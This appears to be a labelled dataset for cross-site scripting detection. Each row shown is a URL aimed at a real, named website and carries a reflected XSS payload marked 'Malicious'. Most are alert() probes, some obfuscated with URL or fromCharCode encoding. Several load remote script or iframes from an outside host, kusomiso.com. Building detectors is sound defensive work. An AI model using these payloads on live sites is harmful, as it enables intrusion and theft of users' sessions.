Payloads,Class
http://www.xixixi.jp/xixixi2/j/pwd_send.php?mno=&amp;scd=1&amp;sk=1&amp;idp=&amp;qs=&amp;nonlogin=1%22%3e'%3e%3cscript%3<br>ealert('x')%3c/script%3e,Malicious
http://www.xixixi.jp/xixixi2/index.html?scd=1&amp;qs=%22%3e'%3e%3cscript%3ealert('x')%3c/script%3e&amp;idp=&amp;<br>kno=,Malicious
http://adult.agesage.jp/memberpage.html?mcd=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso%2eco<br>m%2fxss%2ejs%3e%3c%2fscript%3e,Malicious
https://www2.kyoto-wu.ac.jp/club/calendar/detail.cgi?event_id=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%<br>2f%2fkusomiso%2ecom%2fxss%2ejs%3e%3c%2fscript%3e,Malicious
http://www.chk.moe.go.th/reply.php?nid=11008%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso%2eco<br>m%2fxss%2ejs%3e%3c%2fscript%3e,Malicious
http://www.yst1.go.th/school/yangklang/guestbook/admin.php?id='%3e%22%3e%3ciframe%20src=http://kusom<br>iso.com/xss.html%20%3c,Malicious
http://sokth.chpho.go.th/main/guestbook/admin.php?id=9136%27%3e%22%3e%3ciframe%20src%3dhttp%3a%2f%2f<br>kusomiso%2ecom%2fxss%2ehtml%20%3c,Malicious
http://www.school.obec.go.th/khokklang/guestbook/admin.php?id=859%27%3e%22%3e%3ciframe%20src%3dhttp%<br>3a%2f%2fkusomiso%2ecom%2fxss%2ehtml%20%3c,Malicious
http://se.boincstats.com/bam/register.php?email=%22%3e%3ch1%3eby%20kusomiso.com%3c/h1%3e&amp;name=%22%3e<br>%3ch1%3eby%20kusomiso.com%3c/h1%3e%3cscript%3ealert(1)%3c/script%3e,Malicious
http://orpheus.nascom.nasa.gov/~zarro/php/ssw_print.php?file=%%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%<br>2f%2fkusomiso%2ecom%2fxss%2ejs%3e%3c%2fscript%3e,Malicious
http://www.atamanikita.com/cgi-bin/im.cgi?page=%22%3e'%3e%3cscript%3ealert('xss')%3c/script%3e,Malicious
http://www.mimima.com/link.php?ref='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3<br>e,Malicious
http://www.mahoron.fks.ed.jp/cgi-bin/frm_ken.cgi?namek='%3e%22%3e%3cscript/src=http://kusomiso.com/x<br>ss.js%3e%3c/script%3e&amp;sex=%92j&amp;sex=%8f%97&amp;name=&amp;seinen=%8f%ba%98a&amp;seinen=%95%bd%90%ac&amp;year=&amp;month=&amp;d<br>ay=&amp;jyusyok=&amp;yubin1=&amp;yubin2=&amp;jyusyo=&amp;tel1=&amp;mail=&amp;kensyu=&amp;kinmu1=&amp;yubin3=&amp;yubin4=&amp;kinmu2=&amp;kinmu3=&amp;tel<br>2=&amp;kinmu4=&amp;syoku=&amp;cyousa=&amp;bikou=&amp;mou1=&amp;2=&amp;3=&amp;submit=%8am%94f%89%e6%96%ca%82%d6&amp;submit2=%82%e2%82%e8%<br>92%bc%82%b5,Malicious
http://www.kenthinks.com/cgi/search.cgi?keywords=%22%3e'%3e%3cscript%3ealert('x')%3c/script%3e,Malicious
http://domain.webk.net/domain/whois/result.cgi?domain='%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20<br>kusomiso.com%22)%3c/script%3e&amp;domainch=&amp;lang=ja,Malicious
http://mail.goo.ne.jp/announce/t/index.ghtml?uname=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomi<br>so%2ecom%2fxss%2ejs%3e%3c%2fscript%3e,Malicious
http://tool-6.net/edit.cgi?id=sadsadapwq&amp;mode=logincheck&amp;yourp=1234%22%3e'%3e%3cscript%3ealert('x')%<br>3c/script%3e,Malicious
http://www.max.hi-ho.ne.jp/cgi-bin/user/teo_imperial/pageviewi.cgi?dom=be.2ch.net&amp;brd=%22%3e'%3e%3cs<br>cript%3ealert('x')%3c/script%3e,Malicious
"http://www.gameplanet.jp/gameinfo/list.htm?sort2=70%22%3e'%3e%3cscript%3ealert(string.fromcharcode(8<br>8,83,83))%3c/script%3e",Malicious
http://www.sapphiretech.com/jn/search/search.php?posted=1&amp;keyword=%22%3e%27%3e%3c%73%63%72%69%70%74%<br>3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%3<br>8%33%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;submit=search%20products%20-%3e,Malicious
http://www.njliji.com/search.asp?field=title&amp;bigclassname=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c<br>%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%<br>29%3c%2f%73%63%72%69%70%74%3e%0a65%28%38%38%2c%38%33%2c%38%33%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;su<br>bmit=%cb%d1%cb%f7,Malicious
http://google.sina.com.hk/cgi-bin/webpage_full.cgi?word=ipod+touch&amp;lr=lang_zh-tw%22%3e'%3e%3cscript%<br>3ealert('x')%3c/script%3e&amp;1,Malicious
http://acp2.cn/?action=index&amp;setdate=200710&amp;setday=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%<br>74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%29%3c%2<br>f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://ejang.new21.org/blog/tt/?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%70%<br>74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2<br>c%38%33%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://blog.synec.net/?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%<br>6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%3<br>2%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c<br>%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://rasthie.com/tt/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%70%<br>74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%3<br>1%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31<br>%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://www.st-one.com/zoe/blog/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%<br>72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2<br>c%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31<br>%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://interlude.pe.kr/tt/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69<br>%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%<br>32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2<br>c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://fish59.idv.tw/blog/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69<br>%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%<br>32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2<br>c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://www.jeongtaesung.com/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%<br>69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%3<br>1%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35<br>%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://hk.dmz-plus.com/a-news.cgi?date=2007.11.30&amp;cal=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%<br>72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%3<br>1%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36<br>%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://s.readmej.com/search.cgi?title=on&amp;comment=on&amp;genre=on&amp;key=%22%3e%27%3e%3c%73%63%72%69%70%74%3<br>e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c<br>%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%<br>31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.flib.jp/flipviewer/popupfv/40/nopdf/indexnie.php?opf=%22%3e%27%3e%3c%73%63%72%69%70%74%3e<br>%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%<br>33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%3<br>1%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;ver=gen,Malicious
http://www.iwamikanko.org/event/a-news.cgi?date=2007.11.30&amp;cal=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%<br>61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%3<br>3%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31<br>%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.shindai-nav.com/neccomi/cgi/a-news/a-news.cgi?date=2007.11.30&amp;cal=%22%3e%27%3e%3c%73%63%7<br>2%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c<br>%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%<br>35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://maniya-web.hp.infoseek.co.jp/cgi-bin/bbsnote.cgi?log=12693%22%3e'%3e%3cscript%3ealert('by%20k<br>usomiso.com')%3c/script%3e&amp;fc=thread&amp;res=0-11%22%3e'%3e%3cscript%3ealert('x')%3c/script%3e,Malicious
http://ask.jp/blog.asp?o=%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2866%2c121%2c32%2c107%2<br>c117%2c115%2c111%2c109%2c105%2c115%2c111%2c46%2c99%2c111%2c109%29%29%3c%2fscript%3e%0d%0a&amp;qsrc=96&amp;q=<br>link%3ahttp%3a%2f%2fwww.youtube.com%2fwatch%3fv%3dqvsgrwqgvl0&amp;btnblg.x=0&amp;btnblg.y=0&amp;hq=,Malicious
http://ask.jp/video.asp?o=%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2866%2c121%2c32%2c107%<br>2c117%2c115%2c111%2c109%2c105%2c115%2c111%2c46%2c99%2c111%2c109%29%29%3c%2fscript%3e%0d%0a&amp;qsrc=96&amp;q<br>=link%3ahttp%3a%2f%2fwww.youtube.com%2fwatch%3fv%3dqvsgrwqgvl0&amp;hq=&amp;btnvdo.x=45&amp;btnvdo.y=11,Malicious
http://ask.jp/web.asp?o=%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2866%2c121%2c32%2c107%2c<br>117%2c115%2c111%2c109%2c105%2c115%2c111%2c46%2c99%2c111%2c109%29%29%3c%2fscript%3e%0d%0a&amp;qsrc=294&amp;so<br>rt=&amp;q=link%3ahttp%3a%2f%2fwww.youtube.com%2fwatch%3fv%3dqvsgrwqgvl0&amp;btnweb.x=21&amp;btnweb.y=6,Malicious
http://ask.jp/item/item.asp?o=%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2866%2c121%2c32%2c<br>107%2c117%2c115%2c111%2c109%2c105%2c115%2c111%2c46%2c99%2c111%2c109%29%29%3c%2fscript%3e%0d%0a&amp;qsrc=<br>9&amp;q=link%3ahttp%3a%2f%2fwww.youtube.com%2fwatch%3fv%3dqvsgrwqgvl0&amp;sm=0&amp;btnitm.x=61&amp;btnitm.y=4,Malicious
https://video.ask.jp/loginsignup.do?memberfriendid=&amp;registerid=&amp;username=%22%3e%27%3e%3c%73%63%72%69<br>%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%<br>32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2<br>c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;password=,Malicious
http://ask.jp/trend/keyword.asp?o=0%22%3e'%3e%3cscript%3ealert('x')%3c/script%3e,Malicious
http://www.govexec.com/story_page.cfm?filepath=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%2<br>8%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37<br>%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%<br>39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.bvca.co.uk/agm/agm.php?setdate=2007-10-01%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72<br>%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%<br>30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2<br>c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.hotels-petersburg-russia.com/includes/setdate.php?year=2008&amp;month=09&amp;u=&amp;day=27&amp;hour=12&amp;ty<br>pe=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%<br>72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%3<br>0%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63<br>%72%69%70%74%3e%0a,Malicious
http://hotphpscript.com/signinform.php?msg=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53<br>%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%<br>31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2<br>c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.netcomponents.com/ja/results.htm?r=1&amp;t=f&amp;src=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%6<br>5%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c<br>%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%<br>36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;so=&amp;d=1&amp;pn1=u@@@@@@@@@@@,Malicious
http://imepita.jp/pc/plusurl_send.php?mailaddr=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%2<br>8%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37<br>%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%<br>39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;domain=docomo.ne.jp,Malicious
http://bbs.leobbs.com/cgi-bin/forums.cgi?forum=80%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74<br>%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%<br>37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%3<br>9%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.combust.cn/cgi-bin/topic.cgi?forum=71&amp;topic=175&amp;show=90%22%3e%27%3e%3c%73%63%72%69%70%74%<br>3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2<br>c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31<br>%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
https://www.ssitristar.com/shops/membadd?action=disp&amp;to=memlogn%22%3e%27%3e%3c%73%63%72%69%70%74%3e%<br>61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%3<br>3%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31<br>%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.accessup.org/anime/top_edit.asp?lang=j&amp;from=pc&amp;ics=euc&amp;ocs=euc&amp;user_name=%82%90&amp;password=<br>%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%<br>43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%3<br>9%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72<br>%69%70%74%3e%0a&amp;todo=%a5%ed%a5%b0%a5%a4%a5%f3,Malicious
http://sw.freedom.net/portal/swportal?partnerid=23&amp;lang=en&amp;component=spyware&amp;spyware=%27%3e%22%3e%3c<br>%53%43%52%49%50%54%2f%53%52%43%3d%68%74%74%70%3a%2f%2f%6b%75%73%6f%6d%69%73%6f%2e%63%6f%6d%2f%78%73%<br>73%2e%6a%73%3e%3c%2f%53%43%52%49%50%54%3e%0a&amp;option=removal,Malicious
http://www.filebank.co.jp/cgi-bin/folder/guest_loginform.cgi?gname=vipchinko&amp;gfname=%22%3e%27%3e%3c%<br>73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%3<br>6%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c<br>%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://sho.tdiary.net/?year=2006'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e;m<br>onth=1h;category=l,Malicious
http://shonan-networks.jp/fudou-san/cken.cgi?mode=chintaisyousai&amp;targetno=0330&amp;gid=sho&amp;pageno=1&amp;retu<br>rl=mecgi%22%3e%27%3e%3cscript%3ealert%28%22kusomiso.com%22%29%3c%2fscript%3e&amp;chklist=0,Malicious
http://www.cism.it/cgi/course.cgi?year=2004%22%3e'%3e%3cscript%3ealert('xss')%3c/script%3e,Malicious
http://www.snsi-j.jp/boyakif/diary.cgi?start=1&amp;pass=%22%3e'%3e%3cscript%3ealert('xss')%3c/script%3e,Malicious
http://mrchildren.jpn.org/mr/test/ir.cgi/%22%3e'%3e%3ciframe%20src=javascript:alert('kusomiso.com');<br>%3e%3c/iframe%3e,Malicious
http://edda.realmind.net/tt/index.php?setdate=200612%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72<br>%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%<br>30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2<br>c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://yoasobi-ch.net/bbs/ych-bbs/resjump.cgi?bottom=undefined&amp;bbs=unei&amp;key=1&amp;no=%22%3e%3cbody%20onl<br>oad%3dalert%28%27kusomiso%2ecom%27%29%3e&amp;bottom=undefined,Malicious
http://www.openlab.cn/cgi-bin/forums.cgi?forum=1%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%<br>28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%3<br>7%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39<br>%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.securityspace.com/smysecure/catid.html?ctype=cve&amp;id=%3c/title%3e%3cscript%3ealert(/kusomi<br>so.com/)%3c/script%3e,Malicious
http://mkt.fem.jp/color.cgi?bg=&amp;bg=%22%3e%27%3e%3cscript%3ealert%28%22kusomiso.com%22%29%3c%2fscript<br>%3e&amp;text=&amp;text=&amp;link=&amp;link=&amp;alink=&amp;alink=&amp;vlink=&amp;vlink=,Malicious
http://www.gametrailers.com/cc2k7.php?p=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74<br>%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%<br>31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%3<br>1%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.gametrailers.com/gdc2k7.php?p=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%7<br>4%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31<br>%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%<br>31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://zonealarm.com/store/content/catalog/download_buy.jsp?dc=34std&amp;ctry=%22%3e%27%3e%3c%73%63%72%6<br>9%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31<br>%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%<br>2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;lang=ja,Malicious
http://www.spm.gov.cm/showdoc.php?txtrech=%3cscript%3ealert%28%27xylitol+own+you%27%29%3c%2fscript%3<br>e&amp;button=go&amp;lang=fr,Malicious
http://escrow-fraud.com/search.php?search=%3cscript%3ealert%28%27xylitol+for+xssed.com%27%29%3c%2fsc<br>ript%3e&amp;submit=submit,Malicious
http://search.sybase.com/search/simple.do?keyword=%3cscript%3ealert%28%27xylitol+is+back%27%29%3c%2f<br>script%3e&amp;image=search&amp;omitsimilarbasic=1&amp;pagenumbasic=1&amp;databasebasic=&amp;subcategorybasic=&amp;categoryst<br>ringbasic=&amp;subcategorystringbasic=&amp;bcountbasic=0&amp;loginrefer=http%3a%2f%2fsearch.sybase.com,Malicious
http://www.xylitol.net/index.php?action=search&amp;search-action=search&amp;search-phrase=%22%3e%3cscript%3e<br>alert%280%29%3c%2fscript%3e&amp;x=10&amp;y=7,Malicious
